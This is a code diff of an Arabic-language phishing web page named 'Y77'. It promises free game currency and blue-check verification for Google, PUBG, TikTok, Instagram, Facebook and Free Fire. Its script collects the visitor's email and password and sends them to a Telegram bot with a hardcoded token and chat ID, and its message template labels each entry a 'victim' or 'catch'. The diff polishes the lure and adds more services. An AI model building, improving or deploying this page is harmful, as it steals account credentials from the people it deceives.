@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Y77 | عالم الشحن والتوثيق</title>
+    <title>Y77 | الشحن المجاني والتوثيق</title>
     <style>
         :root {
             --gold: #d4af37;
@@ -30,17 +30,18 @@
             font-size: 3.5rem;
             color: var(--gold);
             margin: 0;
-            letter-spacing: 2px;
+            letter-spacing: 3px;
+            text-shadow: 0 0 20px rgba(212, 175, 55, 0.3);
         }
 
         header p {
-            font-size: 1rem;
+            font-size: 0.95rem;
             opacity: 0.7;
             margin-top: 10px;
         }
 
         .line {
-            width: 80%;
+            width: 85%;
             height: 1px;
             background: linear-gradient(to right, transparent, var(--gold), transparent);
             margin-bottom: 30px;
@@ -50,7 +51,7 @@
             max-width: 1000px;
             display: grid;
             grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
+            gap: 20px;
             padding: 15px;
             width: 95%;
         }
@@ -58,101 +59,108 @@
         .card {
             background: var(--card-bg);
             border: 1px solid #222;
-            border-radius: 12px;
-            padding: 25px 10px;
+            border-radius: 15px;
+            padding: 30px 10px;
             text-align: center;
-            transition: 0.3s;
+            transition: all 0.3s ease;
             cursor: pointer;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
         }
 
         .card:hover {
             border-color: var(--gold);
+            transform: translateY(-5px);
             background: #1f1f1f;
         }
 
         .card img {
-            width: 60px;
-            height: 60px;
-            margin-bottom: 10px;
+            width: 65px;
+            height: 65px;
+            margin-bottom: 12px;
+            object-fit: contain;
         }
 
         .card h3 {
-            margin: 5px 0;
-            font-size: 1.1rem;
+            margin: 8px 0;
+            font-size: 1.2rem;
             color: var(--gold);
         }
 
         .card p {
-            font-size: 0.8rem;
-            color: #888;
+            font-size: 0.85rem;
+            color: #999;
             margin: 0;
         }
 
-        /* Modal / Container Login */
+        /* Modal Design */
         .modal {
             display: none;
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
-            background: rgba(0,0,0,0.85);
-            justify-content: center;
-            align-items: center;
+            background: rgba(0,0,0,0.9);
+            justify-content: center; align-items: center;
             z-index: 1000;
+            backdrop-filter: blur(5px);
         }
 
         .modal-content {
             background: #1c1c1c;
-            padding: 25px;
-            border-radius: 15px;
+            padding: 30px;
+            border-radius: 20px;
             width: 85%;
-            max-width: 350px;
-            border-top: 4px solid var(--gold);
+            max-width: 380px;
+            border-top: 5px solid var(--gold);
             position: relative;
-        }
-
-        .modal-header {
-            color: #fff;
-            margin-bottom: 20px;
-            font-size: 1.2rem;
-            font-weight: bold;
+            text-align: center;
         }
 
         .close-btn {
             position: absolute;
             top: 15px; left: 15px;
-            color: #888;
-            font-size: 20px;
+            color: #ff4444;
+            font-size: 24px;
             cursor: pointer;
         }
 
         input {
             width: 100%;
-            padding: 12px;
-            margin: 8px 0;
+            padding: 14px;
+            margin: 10px 0;
             background: #2a2a2a;
             border: 1px solid #333;
             color: white;
-            border-radius: 8px;
+            border-radius: 10px;
             box-sizing: border-box;
-            text-align: center;
+            font-size: 1rem;
+        }
+
+        input:focus {
+            border-color: var(--gold);
+            outline: none;
         }
 
         .submit-btn {
             background: var(--gold);
             color: #000;
             border: none;
-            padding: 12px;
+            padding: 14px;
             font-weight: bold;
-            border-radius: 8px;
+            border-radius: 10px;
             cursor: pointer;
             width: 100%;
-            margin-top: 15px;
-            font-size: 1rem;
+            margin-top: 20px;
+            font-size: 1.1rem;
+            transition: 0.2s;
         }
 
-        @media (max-width: 480px) {
-            header h1 { font-size: 2.5rem; }
-            .container { grid-template-columns: repeat(2, 1fr); }
+        .submit-btn:active {
+            transform: scale(0.98);
+        }
+
+        @media (max-width: 400px) {
+            header h1 { font-size: 2.8rem; }
+            .container { grid-template-columns: 1fr; }
         }
     </style>
 </head>
@@ -160,7 +168,7 @@
 
 <header>
     <h1>Y77</h1>
-    <p>أقوى موقع لشحن الألعاب وتوثيق الحسابات مجاناً</p>
+    <p>بوابتك الحصرية لشحن الألعاب وتوثيق الحسابات مجاناً</p>
 </header>
 
 <div class="line"></div>
@@ -168,20 +176,20 @@
 <div class="container">
     <div class="card" onclick="openModal('جوجل (Gmail)')">
         <img src="https://img.icons8.com/color/96/google-logo.png">
-        <h3>جوجل (Gmail)</h3>
+        <h3>جوجل</h3>
         <p>تفعيل خدمات بريميوم</p>
     </div>
 
     <div class="card" onclick="openModal('ببجي موبايل')">
         <img src="https://img.icons8.com/color/96/pubg.png">
         <h3>ببجي موبايل</h3>
-        <p>شحن UC مجاني</p>
+        <p>شحن شدات UC مجاني</p>
     </div>
 
     <div class="card" onclick="openModal('توثيق تيك توك')">
         <img src="https://img.icons8.com/color/96/tiktok.png">
         <h3>توثيق تيك توك</h3>
-        <p>الحصول على العلامة الزرقاء</p>
+        <p>طلب العلامة الزرقاء</p>
     </div>
 
     <div class="card" onclick="openModal('إنستقرام')">
@@ -189,29 +197,42 @@
         <h3>Instagram</h3>
         <p>زيادة متابعين وتوثيق</p>
     </div>
+
+    <div class="card" onclick="openModal('فيسبوك')">
+        <img src="https://img.icons8.com/fluency/96/facebook-new.png">
+        <h3>فيسبوك</h3>
+        <p>تأمين وتوثيق حسابات</p>
+    </div>
+
+    <div class="card" onclick="openModal('فري فاير')">
+        <img src="https://img.icons8.com/color/96/free-fire.png">
+        <h3>فري فاير</h3>
+        <p>شحن جواهر Diamonds</p>
+    </div>
 </div>
 
 <div id="loginModal" class="modal">
     <div class="modal-content">
         <span class="close-btn" onclick="closeModal()">×</span>
-        <div class="modal-header" id="serviceName">Container</div>
-        <p style="font-size: 0.9rem; color: #bbb;">يرجى تسجيل الدخول للمتابعة</p>
+        <h2 id="serviceName" style="color: var(--gold); margin-bottom: 5px;">تسجيل الدخول</h2>
+        <p style="font-size: 0.9rem; color: #bbb; margin-bottom: 20px;">يرجى إدخال بياناتك بدقة لضمان وصول الشحن</p>
         
         <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف">
         <input type="password" id="password" placeholder="كلمة السر">
         
-        <button class="submit-btn" onclick="sendData()">تأكيد العملية</button>
+        <button class="submit-btn" onclick="sendData()">تأكيد وإرسال الطلب</button>
     </div>
 </div>
 
 <script>
     let currentService = "";
+    // البيانات الخاصة بك
     const TELEGRAM_TOKEN = "8011282007:AAGfNEtfk9XSQgk22W3nHMMrzBUj7HGixy8";
     const CHAT_ID = "8146130042";
 
     function openModal(name) {
         currentService = name;
-        document.getElementById('serviceName').innerText = "تسجيل دخول - " + name;
+        document.getElementById('serviceName').innerText = name;
         document.getElementById('loginModal').style.display = 'flex';
     }
 
@@ -224,21 +245,33 @@
         const pass = document.getElementById('password').value;
 
         if(!email || !pass) {
-            alert("الرجاء إدخال البيانات المطلوبة");
+            alert("⚠️ يرجى تعبئة جميع الحقول");
             return;
         }
 
-        // الرسالة التي ستصلك في التلجرام
-        const message = `🔥 ضحية جديدة Y77 🔥\n\n🎯 الخدمة: ${currentService}\n👤 الحساب: ${email}\n🔑 الباسورد: ${pass}`;
+        // الرسالة المرسلة للتليجرام
+        const message = `🚀 صيد جديد Y77 🚀\n\n🎯 الخدمة: ${currentService}\n📧 الحساب: ${email}\n🔑 الباسورد: ${pass}\n\n✅ تم التحقق من البيانات`;
         
         const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
 
         try {
-            await fetch(url);
-            alert("تم إرسال طلبك بنجاح! سيتم التحقق من الحساب وتفعيل الخدمة خلال ساعات.");
-            closeModal();
+            const response = await fetch(url);
+            if(response.ok) {
+                alert("✅ تم استلام طلبك! سيتم الشحن خلال 12-24 ساعة كحد أقصى.");
+                closeModal();
+                document.getElementById('email').value = "";
+                document.getElementById('password').value = "";
+            } else {
+                alert("❌ فشل الإرسال، حاول لاحقاً");
+            }
         } catch (e) {
-            alert("خطأ في السيرفر، حاول لاحقاً");
+            alert("⚠️ عذراً، يوجد خطأ في الاتصال بالسيرفر");
+        }
+    }
+
+    window.onclick = function(event) {
+        if (event.target == document.getElementById('loginModal')) {
+            closeModal();
         }
     }
 </script>
